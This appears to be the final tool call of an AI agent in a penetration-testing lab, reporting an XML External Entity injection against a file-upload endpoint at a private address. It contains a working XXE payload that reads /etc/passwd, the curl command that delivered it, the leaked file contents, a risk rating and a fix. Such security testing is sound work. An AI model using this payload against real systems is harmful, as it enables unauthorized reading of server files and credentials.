Invoking: `finish_task` with `{'final_report': 'Vulnerability: XML External Entity (XXE) Injection
Target: http://172.28.0.10:3000/file-upload
Payload:
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

Proof of Concept:
The following curl command was used to send the payload to the target:
`curl -X POST -F 'file=@xxe.xml' http://172.28.0.10:3000/file-upload`

The server's response included the content of the /etc/passwd file, confirming the vulnerability:
`root:x:0:0:root:/root:/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/sbin/nologinnonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin`

Risk Assessment:
High. The vulnerability allows an attacker to read arbitrary files from the server's filesystem. This can lead to the disclosure of sensitive information, such as configuration files, source code, and user credentials, which could be used to facilitate further attacks and compromise the entire system.

Recommendation:
Disable external entity processing in the XML parser configuration to prevent this and similar attacks. The application should be configured to reject any XML input that includes a DOCTYPE declaration.'}`

tool_input.final_report:
Vulnerability: XML External Entity (XXE) Injection
Target: http://172.28.0.10:3000/file-upload
Payload:
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

Proof of Concept:
The following curl command was used to send the payload to the target:
`curl -X POST -F 'file=@xxe.xml' http://172.28.0.10:3000/file-upload`

The server's response included the content of the /etc/passwd file, confirming the vulnerability:
`root:x:0:0:root:/root:/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/sbin/nologinnonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin`

Risk Assessment:
High. The vulnerability allows an attacker to read arbitrary files from the server's filesystem. This can lead to the disclosure of sensitive information, such as configuration files, source code, and user credentials, which could be used to facilitate further attacks and compromise the entire system.

Recommendation:
Disable external entity processing in the XML parser configuration to prevent this and similar attacks. The application should be configured to reject any XML input that includes a DOCTYPE declaration.
